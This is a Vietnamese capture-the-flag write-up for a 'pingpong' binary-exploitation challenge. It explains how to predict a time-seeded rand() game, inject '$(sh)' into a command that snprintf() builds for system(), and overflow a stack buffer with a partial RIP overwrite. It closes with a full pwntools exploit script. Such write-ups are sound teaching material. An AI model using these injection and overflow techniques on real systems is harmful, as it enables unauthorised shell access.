## Lược qua: 
Trong chall này, ta sẽ khai thác lỗ hổng liên quan đến command injection của snprintf(), và lỗ hổng BOF để overwrite một phần của RIP

___
## Cách giải:
### Thông tin:
Thông tin file binary:
```python┌──(kali㉿kali)-[~/CTFs/kcsctf/pwn/pingpong]
└─$ file pingpong 
pingpong: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=067011438000a0e67d82d0d5a94c613a9d9bd3fd, for GNU/Linux 3.2.0, not stripped
```
```python                                                                                             
┌──(kali㉿kali)-[~/CTFs/kcsctf/pwn/pingpong]
└─$ checksec --file=pingpong 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH Symbols   FORTIFY Fortified  Fortifiable FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   58 Symbols  No 0  3  pingpong
```
* `No canary`: không rào cản cho BOF

Output binary:

<img width="804" height="129" alt="image" src="https://github.com/user-attachments/assets/47323598-d936-4e7d-acbf-d1c3b7f0b8bb" />

Disassembly code từ Ghidra:
```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  init(param_1);
  puts("Hi KCSC wannabe! Welcome to my pingpong workshop.");
  puts("Have you ever played pingpong before? Can you beat me at my game?");
  Startgame();
  return 0;
}
```
```c
void Startgame(void)

{
  int random;
  time_t seed;
  char choice [44];
  char odd_even;
  uint count;
  
  count = 0;
  seed = time((time_t *)0);
  srand((uint)seed);
  puts("Game start... ");
  do {
    random = rand();
    odd_even = (char)(random % 2);
    do {
      printf("hit left = \'l\', hit right =\'r\': ");
      __isoc99_scanf("%c%*c",choice);
      if (choice[0] == 'l') break;
    } while (choice[0] != 'r');
    if (((odd_even != 0) || (choice[0] != 'l')) && ((odd_even != 1 || (choice[0] != 'r')))) {
      printf("Missed! The game is over. Total hits: %d\n",(ulong)count);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    count = count + 1;
    printf("Good hit! Total hits: %d\n",(ulong)count);
    if (19 < (int)count) {
      getname();
      return;
    }
  } while( true );
}
```
* hàm `Startgame()` cho 1 minigame trên seed: `time((time_t *)0);` mặc định
```c
void getname(void)

{
  size_t len;
  char feedbank_buff [32];
  
  puts("Can I get your name to put it on the scoreboard.");
  printf("Your Name is: ");
  __isoc99_scanf(&DAT_00102068,&name);
  snprintf(cmd,64,cmd_fmt,&name);
  puts("Feedback for the game:");
  read(0,feedbank_buff,64);
  len = strlen(feedbank_buff);
  if (len < 33) {
    puts("Thanks for your feedback!");
  }
  else {
    puts("Buffer Overflow detected!");
  }
  return;
}
```
* các lỗ hổng tập trung ở hàm này:
  * `snprintf(cmd,64,cmd_fmt,&name);`: command injection
  * `read(0,feedbank_buff,64);`: buffer overflow
```c
void printff(void)

{
  system(cmd);
  return;
}
```
* hàm này gọi đến `system` thực thi `cmd` (cmd injection)
* và không được gọi từ các hàm trên

___
### Khai thác:
* Trước hết là bypass minigame bằng cách dựng seed tương tự:

Trong python:
```python
libc_native = CDLL("libc.so.6")
libc_native.srand(int(time.time())) 
```
Chạy đủ 20 attempts để đến với hàm `getname()`

* Lỗi command injection:

Nằm ở đoạn:
```c
  printf("Your Name is: ");
  __isoc99_scanf(&DAT_00102068,&name);
  snprintf(cmd,64,cmd_fmt,&name);
```
`__isoc99_scanf(&DAT_00102068,&name);`: cho đọc 8 byte string vào `name`
<img width="753" height="126" alt="image" src="https://github.com/user-attachments/assets/d1ce6c10-6d3d-4455-8c2a-3b3aa3a1bfd2" />
`snprintf(cmd,64,cmd_fmt,&name);`: 
  * "echo \"%s\" > /tmp/pingpong_scoreboard"
  * `%s` sẽ là format string cho `&name`
  ==> sẽ thành: `echo "command_injection" > /tmp/pingpong_scoreboard`
<img width="756" height="113" alt="image" src="https://github.com/user-attachments/assets/40c616ca-74a4-4d35-ab09-99c5a69450f6" />
Ví dụ:
```c
echo $(ls)

echo "execute $(sh)" 
```
là cách để dùng `echo` thực thi lệnh 

và ta sẽ dùng lệnh sau để cho shell ( < 8 bytes ):
```c
echo "$(sh)" > /tmp/pingpong_scoreboard
```

sau đấy, gọi `printff()` với lệnh `system(cmd)` để kích hoạt lệnh shell trên 

* Đó là khi cần đến BOF:

Ở đoạn:
```c
  char feedbank_buff [32];
  ...
  puts("Feedback for the game:");
  read(0,feedbank_buff,64);
```
Ta sẽ dùng BOF để overwrite RIP với phần offset của `printff()` (vì có PIE)

```c
└─$ objdump -d pingpong | grep printff
00000000000012a9 <printff>:
```
<img width="802" height="199" alt="image" src="https://github.com/user-attachments/assets/7973b84d-0a15-40da-9e37-be953ca26913" />

Trên gdb:

<img width="818" height="822" alt="pp1" src="https://github.com/user-attachments/assets/49584f79-0cbd-47f6-a27e-9ed0977d710f" />
<img width="804" height="825" alt="pp3" src="https://github.com/user-attachments/assets/a0b61ff5-b614-4626-856b-f9f1ea0130ee" />

Nhưng vì stack-alignment, ta sẽ nhảy tại `printff() + 8`:

<img width="803" height="828" alt="pp21" src="https://github.com/user-attachments/assets/e11d7f8b-8db1-4b7b-b2c8-649c90f1941e" />
<img width="804" height="818" alt="pp22" src="https://github.com/user-attachments/assets/a545065e-0faa-42a6-8c66-6bf41d2fb2e4" />

Sau đấy có thể lấy shell, nhưng:

<img width="809" height="312" alt="pingpong" src="https://github.com/user-attachments/assets/753750df-b7d3-46fe-974e-631d96c6d256" />

Khi ta chạy `echo "$(sh)" > /tmp/pingpong_scoreboard`, `$(sh)` spawn shell, nhưng lại thuộc về `echo`, chứ không gửi đến terminal 

vì stdout nối với $(sh) của echo, ta điều hướng lại về stderr (vấn nối socket máy) với lệnh: `>&2` như trên. 

Script:
```python
from pwn import *
from ctypes import CDLL
import time

def GDB():
    if not args.REMOTE:
        # br *Startgame + 198
        gdb.attach(p, gdbscript=
        '''
        # br *getname 
        # br *getname + 42
        # br *getname + 72
        # br *getname + 117
        # br *getname + 132
        br *getname + 154
        br *getname + 166
        br *getname + 211
        x/20gx $rsp
        x/20gs &cmd_fmt
        ''')

exe = context.binary = ELF('./pingpong', checksec=False)
context.log_level = 'info'

libc_native = CDLL("libc.so.6")
libc_native.srand(int(time.time())) 

# nc 67.223.119.69 5005
def start():
    if args.REMOTE:
        return remote('67.223.119.69', 5005)
    else:
        return process(exe.path)
        
p = start()
GDB()

for i in range(20):
        p.recvuntil(b"hit left = 'l', hit right ='r': ")
        rand_val = libc_native.rand()
        if (rand_val % 2) == 0:
            p.sendline(b'l')
        else:
            p.sendline(b'r')

p.sendlineafter(b'Your Name is: ', b'$(sh)')

printff = b'\xa9\x62'
printff2 = b'\xb1\x62' # nhay qua `push rbp` vì stack alignment
payload = 40 * b'A' + printff2
p.recvuntil(b'Feedback for the game:')
p.send(payload)

p.interactive()
```
